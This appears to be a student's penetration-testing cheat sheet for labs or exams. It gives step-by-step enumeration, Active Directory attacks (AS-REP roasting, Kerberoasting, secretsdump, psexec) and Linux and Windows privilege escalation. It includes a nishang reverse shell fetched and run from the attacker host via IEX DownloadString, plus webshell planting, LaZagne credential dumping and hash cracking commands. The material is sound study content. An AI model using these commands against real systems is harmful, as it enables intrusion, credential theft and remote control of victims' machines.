---
sidebar_position: 1
---

Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!

# Enumeration/Initial Access

## 1. Run begin.sh (basically autorecon)
<details>
While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Look out for non-standard tags like `<wp-includes>` and search them up. Do <a href="./general/Connecting">anonymous login</a> for any main services identified also.

If AD detected:
<details>
- Run dnsrecon
<details>
`dnsrecon -d <a machine> -r <subnet range /8>` (eg `dnsrecon -d 10.10.10.100 -r 10.0.0.0/8`)
</details>

- Check for AS-REP roasting
<details>
Run `impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>` (eg `impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>`). Then run `hashcat --help | grep -i "Kerberos"` and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- (Requires user and plaintext password) Get a shell on victim
<details>
`impacket-psexec <domain>/<user>:<pw>@<dc ip>` Make sure its / not \. Also only works if the user has sufficient perms
</details>

- (Requires user and plaintext password) Check for Kerberoasting
<details>
`sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>` then `sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- (Requires user and plaintext password) [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse
<details>
`impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip>` (eg `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`)
</details>

- (Requires user and plaintext password) Bloodhound it from Windows VM
<details>
connect to the vpn on your windows vm. make sure u can ping the machine, then `.\SharpHound.exe -c all -d <domain> --domaincontroller <dc ip>`. if not working, go Control Panel > Network and Ethernet > Network and Sharing Center > Change adapter settings (on the left bar) > Right-click either and go to properties > doubleclick on IPv4 properties > Preferred DNS server change to the DC IP i think. if still dont work change the other ethernet/interface
</details>
</details>

If SMB detected: [SMB](/docs/general/SMB)

If fetched files from SMB or FTP, run filescanner from cybertools.
</details>

## 2. After nmap full port scan is done
<details>
List down all ports and prioritise which to look thru first.

Look thru full nmap scan for any definitive versions and add that to software/versions list.
</details>

## 3. After everything is done
<details>
- Check feroxbuster for HTTP ports
- Check patterns for any new identified software or CVEs
</details>

# PrivEsc

## Linux
<details>
`su <user>` to lateral move to another user if u know pw

### 1. LinPEAS
Try to [upload](/docs/general/Download%20&%20Upload) LinPEAS and run it. If you can, follow the steps [here](/docs/procedure/LinPEAS)

### 2. pspy
[Upload](/docs/general/Download%20&%20Upload) pspy64 then run `./pspy64`

3. look out for “Analyzing Wordpress Files (limit 70)"
</details>

## Windows
<details>
Always run `dir /r` instead of just `dir` when listing directories (to show alternate data streams)

`cmd /c "<cmd>"` to run cmd commands on powershell. `powershell "<cmd>"` to run powershell commands in cmd

if 32-bit (x86), use https://www.exploit-db.com/exploits/40564

if you only have modify perms, `move orig_file orig_file.bak` then u can download ur malicious file

if u are in the system and there is an apache user, u can try to copy php webshells directly into C:\xampp\htdocs and access it on the website via `/<filename>` and then run a reverse shell from that webshell, allowing u to access the apache user

### No curl and iwr
<details>
if u can run powershell commands on cmd (test using `powershell whoami`) u can:

#### Upgrade your shell
<details>
`cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1` , copy one of the commands in the top of the file (eg `Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>`) and paste it at the bottom. **Remember not to copy the “PS >” part!!** 

Then save the file and `python3 -m http.server 8000` and then `iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<port>/nishang.ps1")`
</details>

You can also run any ps1 file using IEX (see the upgrade shell dropdown above for the command). u can run like winpeas.ps1 or jaws-enum.ps1
</details>

### Run as other user
If you have the user + plaintext password of another user
<details>
Method 1: On kali: `winexe -U <domain>/<user> //<victim ip> cmd.exe` (eg `winexe -U jeeves/Administrator //10.10.10.63 cmd.exe`)

Method 2: Powershell
<details>
```powershell
$secPassword = ConvertTo-SecureString '<pw>' -AsPlainText -Force
$myCreds = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $secPassword)
Start-Process -FilePath "cmd.exe" -Credential $myCreds -NoNewWindow
```
if wrong pw u'll see this
```powershell
PS C:\xampp\htdocs> Start-Process -FilePath "cmd.exe" -Credential $myCreds
Start-Process -FilePath "cmd.exe" -Credential $myCreds
Start-Process : This command cannot be run due to the error: The user name or password is incorrect.
At line:1 char:1
+ Start-Process -FilePath "cmd.exe" -Credential $myCreds
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
```
</details>
</details>

### 1. PowerUp.ps1
Try to [upload](/docs/general/Download%20&%20Upload) PowerUp.ps1 and then `. .\PowerUp.ps1` and `Invoke-AllChecks`

### 2. WinPEAS
Try to [upload](/docs/general/Download%20&%20Upload) WinPEAS and run it. If you can, follow the steps [here](/docs/procedure/WinPEAS)

### 3. LaZagne
<details>
[Upload](/docs/general/Download%20&%20Upload) LaZagne to victim then `./LaZagne.exe all`
</details>

</details>

If found:

- Weird files that you can't open: run `strings <file>` and verify that it is unencrypted (u can make out full strings of english or whatnot), if it is make a wordlist: `strings -n 8 backup.mdb | sort -u > <filename>.txt`, then run it against whatever stuff needs like a pw for it. [WIP, im gonna need a pipeline if im going to make a wordlist for every unopenable weird file that I find]
- NTLM hash: refer to [NTLM](/docs/procedure/NTLM)
- [AD](/docs/general/AD#enumeration)
- cpassword hash: `gpp-decrypt.py <hash>`
- [phpinfo](/docs/procedure/phpinfo)
- [File Upload](/docs/procedure/File%20Upload)
- [Wordpress](/docs/procedure/Wordpress)
- [SQL & PHP](/docs/general/Reverse%20Shell#sql--php-reverse-shell)
- [Password protected files](/docs/procedure/Password%20protected%20files)
- .pst: `readpst <file>` then just open the resulting mdap file, should be readable in vscode
- [.mdb, MongoDB](/docs/procedure/MongoDB)
- [.kdbx, KeePass](/docs/procedure/KeePass)
- [plaintext passwords](/docs/procedure/Plaintext%20PW)
- [unknown hash](/docs/procedure/Hash)
- [`<file1>:<file2>:$DATA` (eg `hm.txt:root.txt:$DATA`)](/docs/procedure/Alternate%20Data%20Stream)

Errors:

- [Clock skew too great](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

